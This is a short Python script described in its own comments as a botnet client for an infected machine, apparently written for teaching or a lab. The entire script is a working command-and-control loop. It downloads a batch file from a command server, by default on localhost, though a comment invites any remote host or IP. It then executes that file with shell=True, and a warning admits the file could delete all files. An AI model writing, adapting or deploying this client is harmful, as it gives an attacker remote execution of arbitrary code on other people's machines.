import requests
import subprocess
import os

"""
Simple botnet client - this would run on the infected machine and connect to the botnet server to get commands

WARNING - Running this will download the commands.bat file from the command server - if that commands.bat file has
somethign malicious in it - you will be running that code here - e.g. if it deletes all files on this machine,
then it will do it!  Be CAREFUL!


"""

# URL of the .bat file on your local or remote server - use a host name or IP address of the server if not running on the same machine
url = "http://localhost:8000/commands.bat"
local_filename = "commands_to_run.bat"

# Download the .bat file from the command server
response = requests.get(url)
if response.status_code == 200:
    with open(local_filename, "wb") as f:
        f.write(response.content)
    print(f"Downloaded '{local_filename}'")

    # Run the .bat file
    try:
        subprocess.run([local_filename], shell=True)
    except Exception as e:
        print(f"Failed to run the script: {e}")
else:
    print(f"Failed to download the file. Status code: {response.status_code}")
